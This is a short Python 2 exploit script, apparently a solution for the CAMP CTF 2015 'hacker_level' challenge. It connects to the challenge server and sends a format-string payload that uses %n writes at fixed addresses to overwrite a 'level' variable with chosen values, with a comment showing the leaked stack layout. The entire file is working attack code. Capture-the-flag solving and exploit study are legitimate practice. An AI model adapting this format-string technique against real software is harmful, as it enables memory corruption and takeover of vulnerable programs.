# campctf 2015 hacker_level
from socket import *
from telnetlib import *
import struct

SERVER = ("challs.campctf.ccc.ac", 10118)

s = socket(AF_INET, SOCK_STREAM)
s.connect(SERVER)
t = Telnet()
t.sock = s

print t.read_until("name?")

fmt  = struct.pack("<I", 0x0804A04C)        # &level
fmt += struct.pack("<I", 0x0804A04C + 2)    # &level + 2
fmt += "%" + str(0x1337 - 8) + "c%7$n"      # 7th argument ; &level
fmt += "%" + str(0xccc3 - 0x1337) + "c%8$n" # 8th argument ; &level + 2
# 1111AAAA 40 b76e5600 bfe57228 bfe57270 b770f570 bfe57220 31313131 41414141

s.send(fmt + "\n")

for i in range(60):
	print s.recv(1024)